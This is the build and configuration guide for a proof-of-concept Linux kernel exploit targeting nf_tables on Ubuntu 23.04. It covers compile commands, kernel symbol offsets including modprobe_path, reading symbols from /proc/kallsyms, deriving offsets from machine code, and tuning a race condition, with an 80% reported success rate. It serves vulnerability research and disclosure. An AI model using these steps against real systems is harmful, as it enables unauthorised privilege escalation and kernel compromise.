# Building And Configuring

The instructions below were tested under Ubuntu 23.04 (Lunar Lobster).


## Installing Build Dependencies

Run the following command to install the build dependencies:

```
sudo apt install gcc libmnl-dev libnftnl-dev
```


## Building Binary

Run the following command to build the PoC binary:

```
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```


## Updating Profile

Built-in profile contains parameters specific to the Linux kernel distributed
in binary form as the following packages from Ubuntu 23.04 (Lunar Lobster):

* "linux-image-6.2.0-20-generic", version "6.2.0-20.20", and
* "linux-modules-6.2.0-20-generic", version "6.2.0-20.20".

The built-in profile looks like this:

```
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
```


### Kernel Symbols

Optional steps to override the built-in profile when testing with other Linux
kernels:

```
modprobe nf_tables
egrep ' (nft_counter_ops|nft_counter_destroy|free_percpu|modprobe_path)(\s|$)' /proc/kallsyms > profile
```


### Machine Code

In order to find the kernel base we examine the `nf_tables.ko` image in the
kernel memory. And specifically, we analyse the machine code of
nft_counter_destroy() subroutine. This means that our method is sensitive to
the compiler as well as the compilation options. However, all the usual cases
can be handled by overriding the built-in profile.

For example, the machine code of nft_counter_destroy() subroutine may look
like this:

```
000000000001e310 <nft_counter_destroy>:
   1e310:       f3 0f 1e fa             endbr64
   1e314:       48 8b 7e 08             mov    rdi,QWORD PTR [rsi+0x8]
   1e318:       e9 00 00 00 00          jmp    <free_percpu>
   1e31d:       0f 1f 00                nop    DWORD PTR [rax]
```

In the above case we can specify a few parameters by appending the three
lines below to the configuration file "profile".

First, we redefine the offset of the dword preceding the `free_percpu`
displacement:

```
5                   nft_counter_destroy_call_offset # hex
```

where the value `5` was computed using the expression `(1e31d - 1e310) - 8`.

As a sanity check, we then validate the dword at the above offset using the
following mask:

```
ffffffff            nft_counter_destroy_call_mask   # hex
```

expecting the following value:

```
e9087e8b            nft_counter_destroy_call_check  # hex
```


### Race Tuning

Exploiting the vulnerability requires winning a race with background worker
thread from the Linux kernel. The built-in profile has been tuned to maximise
the chance of winning that race on a broad range of Intel microprocessors
including mobile Sandy Bridge and desktop Comet Lake. However, some
microprocessors require additional tuning. For example, we observed increased
latency to switch tasks under Alder Lake in certain setups, where it may be
necessary to append the following line to "profile":

```
400                 race_lead_sleep
```

We measured probability of 80% or better to successfully exploit the
vulnerability in our tests that used idle bare-metal systems.


## Testing Recommendations

Once the PoC is started on a vulnerable system, it may leave that system in
an unstable state with corrupted kernel memory. We strongly recommend to test
the PoC on a dedicated system to avoid potential data corruptions.
